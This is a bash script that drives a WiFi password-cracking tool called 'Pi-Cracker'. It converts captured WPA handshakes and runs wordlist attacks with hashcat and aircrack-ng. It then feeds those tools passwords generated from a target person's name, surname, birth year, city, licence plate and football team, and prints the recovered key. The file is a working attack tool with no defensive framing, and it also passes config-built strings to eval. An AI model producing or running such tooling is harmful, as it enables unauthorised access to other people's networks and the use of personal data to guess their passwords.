#!/bin/bash

# ==============================================================================
# Pi-Cracker v7.0: CONTROLLER & ENGINE (STABLE & COMMUNICATIVE)
# ==============================================================================

# --- Configuration ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
cd "$SCRIPT_DIR" || exit 1

ENGINE_SRC="pi_generator_dynamic.c"
ENGINE_BIN="./pi_generator_dynamic"
UI_SRC="pi_ui.c"
UI_BIN="./pi_ui"
WORDLIST_DIR="../Wordlist"

# TEMP DIRECTORY SETUP
TMP_DIR="/tmp/pi_temp"
mkdir -p "$TMP_DIR"

CONFIG_FILE="$TMP_DIR/pi_config.env"
SIGNAL_START="$TMP_DIR/pi_start.signal"
SIGNAL_STOP="$TMP_DIR/pi_stop.signal"
STATUS_FILE="$TMP_DIR/pi_status.txt"
PASS_STATUS_FILE="$TMP_DIR/pi_current_pass.txt"
LOG_FILE="$TMP_DIR/attack.log"
CRACKED_KEY="$TMP_DIR/cracked.key"

# --- Colors ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- Functions ---

update_status() {
    echo "PHASE=$1" > "$STATUS_FILE"
    echo -e "${CYAN}[$(date +%T)] Phase: $1${NC}"
}

update_cycle() {
    echo "CYCLE=$1" >> "$STATUS_FILE"
}

cleanup() {
    echo -e "\n${RED}[!] Shutting down...${NC}"
    kill $UI_PID 2>/dev/null
    pkill -P $$ # Kill child processes (hashcat/aircrack)
    echo -e "${YELLOW}[*] Cleaning up temporary files...${NC}"
    # rm -rf "$TMP_DIR" # Debug için dosyaları tutabiliriz, production'da açarsın.
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT

# --- 1. Setup & Compile ---
# Clear old signals
rm -f "$SIGNAL_START" "$SIGNAL_STOP" "$CRACKED_KEY"

echo -e "${YELLOW}[*] Compiling Attack Engine...${NC}"
gcc "$ENGINE_SRC" -o "$ENGINE_BIN" -lmpfr -lgmp
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Engine compile failed. Install libmpfr-dev and libgmp-dev.${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Compiling Interface...${NC}"
gcc "$UI_SRC" -o "$UI_BIN" -lraylib -lGL -lm -lpthread -ldl -lrt -lX11
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] UI compile failed. Install raylib.${NC}"
    exit 1
fi

# Initialize Status
echo "PHASE=Waiting Config" > "$STATUS_FILE"
echo "CYCLE=0" >> "$STATUS_FILE"
echo "Initializing..." > "$PASS_STATUS_FILE"

# --- 2. Launch UI in Background ---
echo -e "${GREEN}[*] Launching Dashboard...${NC}"
$UI_BIN &
UI_PID=$!

# --- 3. Wait for Start Signal ---
echo -e "${CYAN}[*] Waiting for user configuration...${NC}"
while [ ! -f "$SIGNAL_START" ]; do
    if ! kill -0 $UI_PID 2>/dev/null; then
        echo -e "${RED}[!] UI closed unexpectedly.${NC}"
        exit 1
    fi
    if [ -f "$SIGNAL_STOP" ]; then exit 0; fi
    sleep 0.5
done

# --- 4. Load Config & Initialize ---
source "$CONFIG_FILE"
update_status "Initializing Tools"

# --- 4.1. Intelligent Mode & File Conversion ---
# Default logic based on UI selection
MODE="aircrack"
if [ "$UI_ATTACK_MODE" == "1" ]; then MODE="hashcat";
elif [ "$UI_ATTACK_MODE" == "2" ]; then MODE="aircrack";
elif [ "$UI_ATTACK_MODE" == "0" ]; then
    # AUTO: Prefer Hashcat if file is hc22000 or if GPU exists
    if [[ "$TARGET_FILE" == *".hc22000" ]]; then MODE="hashcat";
    elif command -v hashcat &>/dev/null && command -v nvidia-smi &>/dev/null; then MODE="hashcat"; 
    else MODE="aircrack"; fi
fi

# Validation & Conversion
if [ "$MODE" == "hashcat" ]; then
    if ! command -v hashcat &> /dev/null; then 
        echo -e "${YELLOW}[!] Hashcat not found, falling back to Aircrack.${NC}"
        MODE="aircrack"
    elif [[ "$TARGET_FILE" == *".cap" ]]; then
        # Need conversion
        echo -e "${CYAN}[*] .cap file detected in Hashcat mode. Checking for conversion...${NC}"
        
        # 1. Check if .hc22000 already exists in specific dir
        BASENAME=$(basename "$TARGET_FILE" .cap)
        CONVERTED_FILE="../Handshake/captures/hc22000/${BASENAME}.hc22000"
        
        if [ -f "$CONVERTED_FILE" ]; then
            echo -e "${GREEN}[+] Found existing converted file: $CONVERTED_FILE${NC}"
            TARGET_FILE="$CONVERTED_FILE"
        else
            # 2. Try to convert
            if command -v hcxpcapngtool &> /dev/null; then
                update_status "Converting .cap -> .hc22000"
                mkdir -p "$TMP_DIR/converted"
                TEMP_HC="$TMP_DIR/converted/${BASENAME}.hc22000"
                hcxpcapngtool -o "$TEMP_HC" "$TARGET_FILE" > /dev/null 2>&1
                if [ -f "$TEMP_HC" ]; then
                    echo -e "${GREEN}[+] Conversion successful.${NC}"
                    TARGET_FILE="$TEMP_HC"
                else
                    echo -e "${RED}[!] Conversion failed. Falling back to Aircrack.${NC}"
                    MODE="aircrack"
                fi
            else
                echo -e "${YELLOW}[!] 'hcxpcapngtool' not found. Cannot use Hashcat with .cap file. Falling back to Aircrack.${NC}"
                MODE="aircrack"
            fi
        fi
    fi
fi

# Determine Password Length (Default to 8 if empty)
PASS_LEN=${TARGET_PASS_LEN:-8}
NUM_PASS=${TARGET_NUM_PASS:-10000000}



# --- Helper for Success ---
handle_success() {
    local PASS=$(cat "$CRACKED_KEY")
    update_status "SUCCESS"
    
    echo -e "\n${GREEN}***************************************************${NC}"
    echo -e "${GREEN}*              PASSWORD FOUND!                    *${NC}"
    echo -e "${GREEN}***************************************************${NC}"
    echo -e "${CYAN}        KEY: ${WHITE}$PASS${NC}"
    echo -e "${GREEN}***************************************************${NC}"
    
    wait $UI_PID
    exit 0
}

# --- 5. Phase 0: Wordlist Attack ---
update_status "Wordlist Attack"
update_cycle "0"

# Check if Wordlist dir exists
if [ -d "$WORDLIST_DIR" ]; then
    for wordlist in "$WORDLIST_DIR"/*.txt; do
        [ -e "$wordlist" ] || continue
        
        echo "Trying wordlist: $(basename "$wordlist")" > "$PASS_STATUS_FILE"
        
        if [ "$MODE" == "hashcat" ]; then
            hashcat -m 22000 -a 0 "$TARGET_FILE" "$wordlist" --session pi_hybrid --status --status-timer 1 2>&1 | tee -a "$LOG_FILE"
            RET=${PIPESTATUS[0]} 
            if [ $RET -eq 0 ]; then
                # Extract pure password from hash:pass format
                RAW=$(hashcat -m 22000 -a 0 "$TARGET_FILE" --show)
                # Take everything after the last colon
                echo "${RAW##*:}" > "$CRACKED_KEY"
                handle_success
            fi
        else
            aircrack-ng -w "$wordlist" "$TARGET_FILE" -l "$CRACKED_KEY" 2>&1 | tee -a "$LOG_FILE"
            if [ -f "$CRACKED_KEY" ]; then
                handle_success
            fi
        fi
    done
fi

# --- 6. Phase 1: Dynamic Pi Attack ---

# Auto-detect BSSID for Aircrack if missing
if [ "$MODE" == "aircrack" ] && [ -z "$TARGET_BSSID" ] && [[ "$TARGET_FILE" == *".cap" ]]; then
    echo -e "${YELLOW}[*] BSSID not provided. Analyzing .cap file...${NC}"
    
    # Robust grep to find " Index  MAC  ..." pattern
    DETECTED_BSSID=$(aircrack-ng "$TARGET_FILE" 2>&1 | grep -E "^\s*[0-9]+\s+([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | head -n 1 | awk '{print $2}')
    
    if [ ! -z "$DETECTED_BSSID" ]; then
        TARGET_BSSID="$DETECTED_BSSID"
        echo -e "${GREEN}[+] Auto-detected Target BSSID: $TARGET_BSSID${NC}"
    else
        echo -e "${RED}[!] Could not detect BSSID automatically.${NC}"
        echo -e "${YELLOW}[!] List of networks found in file:${NC}"
        aircrack-ng "$TARGET_FILE" 2>&1 | grep -E "^\s*[0-9]+\s+"
    fi
fi

# Define GEN_ARGS *after* detection so it includes the correct BSSID
GEN_ARGS="--name \"$TARGET_NAME\" --surname \"$TARGET_SURNAME\" --year \"$TARGET_YEAR\" --city \"$TARGET_CITY\" --plate \"$TARGET_PLATE\" --team \"$TARGET_TEAM\" --essid \"$TARGET_ESSID\" --bssid \"$TARGET_BSSID\""

# Prepare Aircrack Target Args
AIRCRACK_TARGET=""
if [ ! -z "$TARGET_BSSID" ]; then
    AIRCRACK_TARGET="-b \"$TARGET_BSSID\""
elif [ ! -z "$TARGET_ESSID" ]; then
    AIRCRACK_TARGET="-e \"$TARGET_ESSID\""
fi

cycle=1
while true; do
    if [ -f "$SIGNAL_STOP" ] || ! kill -0 $UI_PID 2>/dev/null; then break; fi
    
    update_status "Dynamic Pi Gen"
    update_cycle "$cycle"
    
    # Run a block of attacks
    if [ "$MODE" == "hashcat" ]; then
        # Capture exit code safely
        echo "0" > "$TMP_DIR/last_exit_code"
        
        cmd="$ENGINE_BIN $PASS_LEN $NUM_PASS /dev/stdout $GEN_ARGS | hashcat -m 22000 -a 0 \"$TARGET_FILE\" --session pi_hybrid --status --status-timer 1 2>&1 | tee -a \"$LOG_FILE\"; echo \${PIPESTATUS[1]} > \"$TMP_DIR/last_exit_code\""
        eval "$cmd"
        
        RET=$(cat "$TMP_DIR/last_exit_code")
        RET=${RET:-0} 
        
        if [ "$RET" -ne 0 ] && [ "$RET" -ne 1 ]; then
             update_status "ERR: Hashcat ($RET)"
             sleep 5 
             break
        fi

        # Check if found
        if hashcat -m 22000 --show "$TARGET_FILE" | grep -q ":"; then
             RAW=$(hashcat -m 22000 -a 0 "$TARGET_FILE" --show)
             echo "${RAW##*:}" > "$CRACKED_KEY"
             handle_success
        fi
    else
        # Aircrack mode with explicit target
        cmd="$ENGINE_BIN $PASS_LEN $NUM_PASS /dev/stdout $GEN_ARGS | aircrack-ng -w - $AIRCRACK_TARGET \"$TARGET_FILE\" -l \"$CRACKED_KEY\" 2>&1 | tee -a \"$LOG_FILE\""
        eval "$cmd"
        if [ -f "$CRACKED_KEY" ]; then 
            handle_success
        fi
    fi

    cycle=$((cycle + 1))
done

# Keep alive if successful
if [ -f "$CRACKED_KEY" ]; then
    echo "PHASE=SUCCESS" > "$STATUS_FILE"
    echo -e "${GREEN}[!] Password Found! Check UI.${NC}"
    wait $UI_PID
else
    if [ -f "$SIGNAL_STOP" ]; then
        echo -e "${YELLOW}[!] Attack stopped by user.${NC}"
    else
        echo -e "${RED}[!] Attack finished/failed without success.${NC}"
    fi
fi
